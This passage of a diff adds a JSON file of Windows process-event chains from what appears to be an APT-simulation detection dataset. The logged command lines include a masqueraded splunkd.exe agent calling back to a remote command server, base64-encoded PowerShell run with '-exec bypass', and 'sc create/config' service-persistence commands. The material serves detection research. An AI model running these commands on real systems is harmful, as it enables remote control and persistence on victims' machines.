+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "powershell  -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+              "entity_id": "{15959494-C14A-674E-4602-000000001500}",
+              "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+              "hash": {
+                "md5": "95000560239032bc68b4c2fdfcdef913",
+                "sha1": "1b3b40fbc889fd4c645cc12c85d0805ac36ba254",
+                "sha256": "d3f8fade829d2b7bd596c4504a6dae5c034e789b6a3defbe013bda7d14466677"
+              },
+              "name": "powershell.exe",
+              "parent": {
+                "command_line": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start powershell -encodedCommand YwBtAGQAIAAvAGMAIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdABvAHIAXABUAG8AcgBcAHQAbwByAC4AZQB4AGUAIgA= -inputFormat xml -outputFormat text",
+                "entity_id": "{15959494-C14A-674E-4502-000000001500}",
+                "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                "name": "cmd.exe",
+                "pid": 4968
+              },
+              "pid": 5260
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1087",
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Account Discovery",
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Discovery",
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 84832,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "u6qji5MBgaXk-6ahKz-L",
+                "original_index": "wazuh-alerts-4.x-2024.12.03",
+                "processing_version": "1.0.0",
+                "row_sha256": "3b781372a4d722048f7eb88a4c3188387703c0cf8848a8577108b2802c417cb5",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/03-04-December.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 5776,
+                "source_sha256": "91d005371ccce593a61c15dbde1a6780bfadaa5564304f3a20b8733d850b8d35"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S34",
+                "name": "Rocke"
+              }
+            }
+          }
+        ],
+        "explicit_utc": true,
+        "gap_nanoseconds": 53778500,
+        "gap_seconds": 0.0537785,
+        "host": "DESKTOP-QGB4EQH",
+        "join": "same host; parent.process.entity_id = child.process.parent.entity_id"
+      },
+      {
+        "event_ids": [
+          "03823631fd9eb4d213224dee883ca219a7452060d8003e634e0c5c7eabd06d4e",
+          "f33be9eb24ac060a9c43dd7f856f0ab967d1d86b8ba4fe2aca2ec8501c8e4c9a"
+        ],
+        "events": [
+          {
+            "@timestamp": "2024-12-11T19:02:58.099966Z",
+            "agent": {
+              "id": "3",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "03823631fd9eb4d213224dee883ca219a7452060d8003e634e0c5c7eabd06d4e",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "cmd.exe /C powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA",
+              "entity_id": "{15959494-e1e1-6759-bd60-000000000600}",
+              "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "hash": {
+                "md5": "2b40c98ed0f7a1d3b091a3e8353132dc",
+                "sha1": "df79c86fdd11b9ccb89148458e509f879c72566c",
+                "sha256": "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0"
+              },
+              "name": "cmd.exe",
+              "parent": {
+                "command_line": "\\\"C:\\\\Users\\\\Public\\\\splunkd.exe\\\" -server http://172.31.234.82:8888 -group red",
+                "entity_id": "{15959494-be86-6759-6939-000000000600}",
+                "executable": "C:\\\\Users\\\\Public\\\\splunkd.exe",
+                "name": "splunkd.exe",
+                "pid": 4548
+              },
+              "pid": 11808
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 50716,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "Adwat5MBz-gdRqk6audW",
+                "original_index": "wazuh-alerts-4.x-2024.12.11",
+                "processing_version": "1.0.0",
+                "row_sha256": "a8c2a317814c8c81a529f122cc7532dcb3e8c5b361b0c69cbbd0e3d9de20df70",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/11-12-December.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 2704,
+                "source_sha256": "f20c7ebfd1a02025d0b59f435174590133949e228c9cfb43fb04d2591ca98324"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S07",
+                "name": "APT41"
+              }
+            }
+          },
+          {
+            "@timestamp": "2024-12-11T19:02:58.595683Z",
+            "agent": {
+              "id": "3",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "f33be9eb24ac060a9c43dd7f856f0ab967d1d86b8ba4fe2aca2ec8501c8e4c9a",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "powershell  -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA",
+              "entity_id": "{15959494-e1e2-6759-be60-000000000600}",
+              "executable": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+              "hash": {
+                "md5": "2e5a8590cf6848968fc23de3fa1e25f1",
+                "sha1": "801262e122db6a2e758962896f260b55bbd0136a",
+                "sha256": "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
+              },
+              "name": "powershell.exe",
+              "parent": {
+                "command_line": "cmd.exe /C powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA",
+                "entity_id": "{15959494-e1e1-6759-bd60-000000000600}",
+                "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                "name": "cmd.exe",
+                "pid": 11808
+              },
+              "pid": 17284
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1087",
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Account Discovery",
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Discovery",
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 114260,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "Atwat5MBz-gdRqk6audW",
+                "original_index": "wazuh-alerts-4.x-2024.12.11",
+                "processing_version": "1.0.0",
+                "row_sha256": "8e50760f7c689f042882aece11ce862532a03fb35fd25f2d7d4cb4009fbbe699",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/11-12-December.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 5957,
+                "source_sha256": "f20c7ebfd1a02025d0b59f435174590133949e228c9cfb43fb04d2591ca98324"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S34",
+                "name": "Rocke"
+              }
+            }
+          }
+        ],
+        "explicit_utc": true,
+        "gap_nanoseconds": 495717000,
+        "gap_seconds": 0.495717,
+        "host": "DESKTOP-QGB4EQH",
+        "join": "same host; parent.process.entity_id = child.process.parent.entity_id"
+      }
+    ],
+    "T1059.003->T1543.003": [
+      {
+        "event_ids": [
+          "037eafabf296d88c5b73294c469b088fc55c9acd4c40d9844b62421efb34b56b",
+          "2c359f988aa42f122d58d0c26212318b479dec22d3c9805fe6bb2544ccf42cc4"
+        ],
+        "events": [
+          {
+            "@timestamp": "2024-12-03T12:23:06.459265100Z",
+            "agent": {
+              "id": "003",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "037eafabf296d88c5b73294c469b088fc55c9acd4c40d9844b62421efb34b56b",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "cmd.exe /C sc create win32times binPath= \\\"cmd /c start c:\\\\T1036.004_NonExistingScript.ps1\\\" &amp;&amp; sc qc win32times",
+              "entity_id": "{15959494-F82A-674E-9E0E-000000001500}",
+              "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "hash": {
+                "md5": "4e2acf4f8a396486ab4268c94a6a245f",
+                "sha1": "3ce71813199abae99348f61f0caa34e2574f831c",
+                "sha256": "9a7c58bd98d70631aa1473f7b57b426db367d72429a5455b433a05ee251f3236"
+              },
+              "name": "cmd.exe",
+              "parent": {
+                "command_line": "\\\"C:\\\\Users\\\\Public\\\\splunkd.exe\\\" -server http://172.31.234.82:8888 -group red",
+                "entity_id": "{15959494-B00B-674E-8A01-000000001500}",
+                "executable": "C:\\\\Users\\\\Public\\\\splunkd.exe",
+                "name": "splunkd.exe",
+                "pid": 3620
+              },
+              "pid": 7976
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 23262,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "gKp5jJMBgaXk-6ahekcG",
+                "original_index": "wazuh-alerts-4.x-2024.12.03",
+                "processing_version": "1.0.0",
+                "row_sha256": "079c77ba9fcf23a49bbad9e6d9d5ddd3b9f877d23637a271facbe00c5ed8e2d6",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/03-04-December.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 1475,
+                "source_sha256": "91d005371ccce593a61c15dbde1a6780bfadaa5564304f3a20b8733d850b8d35"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S07",
+                "name": "APT41"
+              }
+            }
+          },
+          {
+            "@timestamp": "2024-12-03T12:23:06.470384400Z",
+            "agent": {
+              "id": "003",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "2c359f988aa42f122d58d0c26212318b479dec22d3c9805fe6bb2544ccf42cc4",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "sc  create win32times binPath= \\\"cmd /c start c:\\\\T1036.004_NonExistingScript.ps1\\\"",
+              "entity_id": "{15959494-F82A-674E-9F0E-000000001500}",
+              "executable": "C:\\\\Windows\\\\System32\\\\sc.exe",
+              "hash": {
+                "md5": "d79784553a9410d15e04766aaab77cd6",
+                "sha1": "72785e3068aa52ca223da466595d3863ab6507ab",
+                "sha256": "aeb241959f4a7b7c29f45d27fd65c5326f9592d25badd1a7659de0da351bf96e"
+              },
+              "name": "sc.exe",
+              "parent": {
+                "command_line": "cmd.exe /C sc create win32times binPath= \\\"cmd /c start c:\\\\T1036.004_NonExistingScript.ps1\\\" &amp;&amp; sc qc win32times",
+                "entity_id": "{15959494-F82A-674E-9E0E-000000001500}",
+                "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                "name": "cmd.exe",
+                "pid": 7976
+              },
+              "pid": 7832
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1087",
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Account Discovery",
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Discovery",
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 23286,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "gap5jJMBgaXk-6ahekcG",
+                "original_index": "wazuh-alerts-4.x-2024.12.03",
+                "processing_version": "1.0.0",
+                "row_sha256": "1559a72484cbea9309e9d5593231f6955b8e29737d7d67368cef87c49fc9cf7c",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/03-04-December.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 1476,
+                "source_sha256": "91d005371ccce593a61c15dbde1a6780bfadaa5564304f3a20b8733d850b8d35"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S34",
+                "name": "Rocke"
+              }
+            }
+          }
+        ],
+        "explicit_utc": true,
+        "gap_nanoseconds": 11119300,
+        "gap_seconds": 0.0111193,
+        "host": "DESKTOP-QGB4EQH",
+        "join": "same host; parent.process.entity_id = child.process.parent.entity_id"
+      },
+      {
+        "event_ids": [
+          "047897958bacb22c374a7cd75e00d1ff4d497cf10a2c562dde718589d51006ca",
+          "566a8784d1e8f7f8bd00255f337e607273501ba597ce1d4dcf5afc95e58087a1"
+        ],
+        "events": [
+          {
+            "@timestamp": "2024-12-06T18:44:20.081306900Z",
+            "agent": {
+              "id": "2",
+              "name": "wazuh-agent"
+            },
+            "event": {
+              "code": "1",
+              "id": "047897958bacb22c374a7cd75e00d1ff4d497cf10a2c562dde718589d51006ca",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-FMI6MML"
+            },
+            "process": {
+              "command_line": "cmd.exe /C sc config Fax binPath= \\\"C:\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noexit -c \\\\\\\"write-host 'T1543.003 Test'\\\\\\\"\\\" &amp;&amp; sc start Fax",
+              "entity_id": "{d8af36fb-4604-6753-1b03-000000000900}",
+              "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "hash": {
+                "md5": "2b40c98ed0f7a1d3b091a3e8353132dc",
+                "sha256": "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0"
+              },
+              "name": "cmd.exe",
+              "parent": {
+                "command_line": "\\\"C:\\\\Users\\\\Public\\\\splunkd.exe\\\" -server http://172.31.234.82:8888 -group red",
+                "entity_id": "{d8af36fb-3ea4-6753-fe01-000000000900}",
+                "executable": "C:\\\\Users\\\\Public\\\\splunkd.exe",
+                "name": "splunkd.exe",
+                "pid": 8508
+              },
+              "pid": 3312
+            },
+            "user": {
+              "domain": "DESKTOP-FMI6MML",
+              "name": "maryam"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 32835,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "1lpJnZMBW7IoYvN2fTto",
+                "original_index": "wazuh-alerts-4.x-2024.12.06",
+                "processing_version": "1.0.0",
+                "row_sha256": "5cafe4f6a0d2c637ad0a5aa9405fdda5a04c005eec0ca17612bf60552d9deed9",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/04-07-December.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 2388,
+                "source_sha256": "dc5bab6434b7ff0c329f7f4baaff99d2d52b967cc138a332db7e518e66a12db9"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S07",
+                "name": "APT41"
+              }
+            }
+          },
+          {
+            "@timestamp": "2024-12-06T18:44:20.139543400Z",
+            "agent": {
+              "id": "2",
+              "name": "wazuh-agent"
+            },
+            "event": {
+              "code": "1",
+              "id": "566a8784d1e8f7f8bd00255f337e607273501ba597ce1d4dcf5afc95e58087a1",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-FMI6MML"
+            },
+            "process": {
+              "command_line": "sc  config Fax binPath= \\\"C:\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noexit -c \\\\\\\"write-host 'T1543.003 Test'\\\\\\\"\\\"",
+              "entity_id": "{d8af36fb-4604-6753-1c03-000000000900}",
+              "executable": "C:\\\\Windows\\\\System32\\\\sc.exe",
+              "hash": {
+                "md5": "3fb5cf71f7e7eb49790cb0e663434d80",
+                "sha256": "41f067c3a11b02fe39947f9eba68ae5c7cb5bd1872a6009a4cd1506554a9aba9"
+              },
+              "name": "sc.exe",
+              "parent": {
+                "command_line": "cmd.exe /C sc config Fax binPath= \\\"C:\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noexit -c \\\\\\\"write-host 'T1543.003 Test'\\\\\\\"\\\" &amp;&amp; sc start Fax",
+                "entity_id": "{d8af36fb-4604-6753-1b03-000000000900}",
+                "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                "name": "cmd.exe",
+                "pid": 3312
+              },
+              "pid": 7420
+            },
+            "user": {
+              "domain": "DESKTOP-FMI6MML",
+              "name": "maryam"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1087",
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Account Discovery",
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Discovery",
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 67023,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "11pJnZMBW7IoYvN2gTtU",
+                "original_index": "wazuh-alerts-4.x-2024.12.06",
+                "processing_version": "1.0.0",
+                "row_sha256": "95b061e98f704c3fda3c3447d1a35fe525ca2a915e71095140a4174ce8163857",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/04-07-December.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 4938,
+                "source_sha256": "dc5bab6434b7ff0c329f7f4baaff99d2d52b967cc138a332db7e518e66a12db9"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S34",
+                "name": "Rocke"
+              }
+            }
+          }
+        ],
+        "explicit_utc": true,
+        "gap_nanoseconds": 58236500,
+        "gap_seconds": 0.0582365,
+        "host": "DESKTOP-FMI6MML",
+        "join": "same host; parent.process.entity_id = child.process.parent.entity_id"
+      },
+      {
+        "event_ids": [
+          "055b3470e33ad8428e2722bf6a4fb91b1eab9d551fece613b640d0bc07e56b6a",
+          "7c3a7852bb334c0d486881c08a2ba099f47b7d1cc1a0670bd9ed971c92c68530"
+        ],
+        "events": [
+          {
+            "@timestamp": "2024-12-09T22:31:07.769523100Z",
+            "agent": {
+              "id": "3",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "055b3470e33ad8428e2722bf6a4fb91b1eab9d551fece613b640d0bc07e56b6a",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "cmd.exe /C sc config Fax binPath= \\\"C:\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noexit -c \\\\\\\"write-host 'T1543.003 Test'\\\\\\\"\\\" &amp;&amp; sc start Fax",
+              "entity_id": "{15959494-6FAB-6757-1315-000000001E00}",
+              "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "hash": {
+                "md5": "4e2acf4f8a396486ab4268c94a6a245f",
+                "sha1": "3ce71813199abae99348f61f0caa34e2574f831c",
+                "sha256": "9a7c58bd98d70631aa1473f7b57b426db367d72429a5455b433a05ee251f3236"
+              },
+              "name": "cmd.exe",
+              "parent": {
+                "command_line": "\\\"C:\\\\Users\\\\Public\\\\splunkd.exe\\\" -server http://172.31.234.82:8888 -group red",
+                "entity_id": "{15959494-6971-6757-D511-000000001E00}",
+                "executable": "C:\\\\Users\\\\Public\\\\splunkd.exe",
+                "name": "splunkd.exe",
+                "pid": 12984
+              },
+              "pid": 10064
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 3527,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "v8eMrZMBnOFSf1lyRiEQ",
+                "original_index": "wazuh-alerts-4.x-2024.12.09",
+                "processing_version": "1.0.0",
+                "row_sha256": "69ebdf0e5057a07daf14a77ba96849345df3034681072bf8580d980b55d141fc",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/10-December-P1.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 217,
+                "source_sha256": "896eb72630932598192628f72012ce749786868cc2d1f7217937e555ab588229"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S07",
+                "name": "APT41"
+              }
+            }
+          },
+          {
+            "@timestamp": "2024-12-09T22:31:07.776564400Z",
+            "agent": {
+              "id": "3",
+              "name": "window-agent3"
+            },
+            "event": {
+              "code": "1",
+              "id": "7c3a7852bb334c0d486881c08a2ba099f47b7d1cc1a0670bd9ed971c92c68530",
+              "provider": "Microsoft-Windows-Sysmon"
+            },
+            "host": {
+              "name": "DESKTOP-QGB4EQH"
+            },
+            "process": {
+              "command_line": "sc  config Fax binPath= \\\"C:\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noexit -c \\\\\\\"write-host 'T1543.003 Test'\\\\\\\"\\\"",
+              "entity_id": "{15959494-6FAB-6757-1415-000000001E00}",
+              "executable": "C:\\\\Windows\\\\System32\\\\sc.exe",
+              "hash": {
+                "md5": "d79784553a9410d15e04766aaab77cd6",
+                "sha1": "72785e3068aa52ca223da466595d3863ab6507ab",
+                "sha256": "aeb241959f4a7b7c29f45d27fd65c5326f9592d25badd1a7659de0da351bf96e"
+              },
+              "name": "sc.exe",
+              "parent": {
+                "command_line": "cmd.exe /C sc config Fax binPath= \\\"C:\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noexit -c \\\\\\\"write-host 'T1543.003 Test'\\\\\\\"\\\" &amp;&amp; sc start Fax",
+                "entity_id": "{15959494-6FAB-6757-1315-000000001E00}",
+                "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                "name": "cmd.exe",
+                "pid": 10064
+              },
+              "pid": 5856
+            },
+            "user": {
+              "domain": "DESKTOP-QGB4EQH",
+              "name": "mari"
+            },
+            "windows_apt": {
+              "annotations": {
+                "attack": {
+                  "ids": [
+                    "T1087",
+                    "T1059.003"
+                  ],
+                  "names": [
+                    "Account Discovery",
+                    "Windows Command Shell"
+                  ],
+                  "tactics": [
+                    "Discovery",
+                    "Execution"
+                  ]
+                }
+              },
+              "provenance": {
+                "csv_record_end_line": 63396,
+                "dataset": "Windows-APT 2025",
+                "dataset_version": "4",
+                "original_id": "wMeMrZMBnOFSf1lyRiEQ",
+                "original_index": "wazuh-alerts-4.x-2024.12.09",
+                "processing_version": "1.0.0",
+                "row_sha256": "240907c130353102cd3b1a6dba3a715ff94169d6391be09ba8ef144f096e9722",
+                "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/10-December-P1.csv",
+                "source_representation": "period_csv",
+                "source_row_index": 3198,
+                "source_sha256": "896eb72630932598192628f72012ce749786868cc2d1f7217937e555ab588229"
+              },
+              "quality": {
+                "timestamp": "explicit_utc"
+              },
+              "scenario": {
+                "attribution_strength": "SHARED-WEAK",
+                "id": "S34",
+                "name": "Rocke"
+              }
+            }
+          }
+        ],
+        "explicit_utc": true,
+        "gap_nanoseconds": 7041300,
+        "gap_seconds": 0.0070413,
+        "host": "DESKTOP-QGB4EQH",
+        "join": "same host; parent.process.entity_id = child.process.parent.entity_id"
+      }
+    ]
+  },
+  "service_shell_powershell_chains": [
+    {
+      "event_ids": [
+        "a92fd759d8b04d9161da5913fd5d56098415fad9f482fc94a1b4ff392f76232a",
+        "3154fbb47b3c3efd78fe60f5d197b960a91a267fc38c8db272196e38c200c358",
+        "e46b3e7a7b6f86a51ec757effeaf49ae2ce8438f9223cad86ed6a00f5d7e4aea"
+      ],
+      "events": [
+        {
+          "@timestamp": "2024-11-25T23:07:50.012425300Z",
+          "agent": {
+            "id": "3",
+            "name": "window-agent3"
+          },
+          "event": {
+            "code": "7045",
+            "id": "a92fd759d8b04d9161da5913fd5d56098415fad9f482fc94a1b4ff392f76232a",
+            "provider": "Service Control Manager"
+          },
+          "host": {
+            "name": "DESKTOP-QGB4EQH"
+          },
+          "windows_apt": {
+            "annotations": {
+              "attack": {
+                "ids": [
+                  "T1543.003"
+                ],
+                "names": [
+                  "Windows Service"
+                ],
+                "tactics": [
+                  "Persistence",
+                  "Privilege Escalation"
+                ]
+              }
+            },
+            "original": {
+              "_source.data.win.eventdata.accountName": "LocalSystem",
+              "_source.data.win.eventdata.imagePath": "C:\\\\Windows\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt",
+              "_source.data.win.eventdata.serviceName": "ARTService",
+              "_source.data.win.eventdata.serviceType": "user mode service",
+              "_source.data.win.eventdata.startType": "demand start"
+            },
+            "provenance": {
+              "csv_record_end_line": 37335,
+              "dataset": "Windows-APT 2025",
+              "dataset_version": "4",
+              "original_id": "NiSUZZMBP3GtbmxP2Ifg",
+              "original_index": "wazuh-alerts-4.x-2024.11.25",
+              "processing_version": "1.0.0",
+              "row_sha256": "06bb654cf0e6c19f40c76f614582e4dae8962f86a57335112c565280482b3394",
+              "source_file": "windows-apt-2025-v4/Windows-APT 2025 A Dataset for APT-Inspired Attack/23-30-November.csv",
+              "source_representation": "period_csv",
+              "source_row_index": 2991,
+              "source_sha256": "1ff4ba90457024fe61e1416da8c755d53bd23a9937a3d75b80d44f7122d57373"
+            },
+            "quality": {
+              "timestamp": "explicit_utc"
+            },
+            "scenario": {
+              "attribution_strength": "SHARED-WEAK",
+              "id": "S07",
+              "name": "APT41"
+            }
+          }
+        },
+        {
+          "@timestamp": "2024-11-25T23:07:50.027718700Z",
+          "agent": {
+            "id": "3",
+            "name": "window-agent3"
+          },
+          "event": {
+            "code": "1",
+            "id": "3154fbb47b3c3efd78fe60f5d197b960a91a267fc38c8db272196e38c200c358",
+            "provider": "Microsoft-Windows-Sysmon"
+          },
+          "host": {
+            "name": "DESKTOP-QGB4EQH"
+          },
+          "process": {
+            "command_line": "C:\\\\Windows\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt",
+            "entity_id": "{15959494-0346-6745-5B05-000000000500}",
+            "executable": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "hash": {
+              "md5": "4e2acf4f8a396486ab4268c94a6a245f",
+              "sha1": "3ce71813199abae99348f61f0caa34e2574f831c",
+              "sha256": "9a7c58bd98d70631aa1473f7b57b426db367d72429a5455b433a05ee251f3236"
+            },
+            "name": "cmd.exe",
+            "parent": {
+              "command_line": "C:\\\\Windows\\\\system32\\\\services.exe",
+              "entity_id": "{15959494-DC0A-6744-0B00-000000000500}",
+              "executable": "C:\\\\Windows\\\\System32\\\\services.exe",
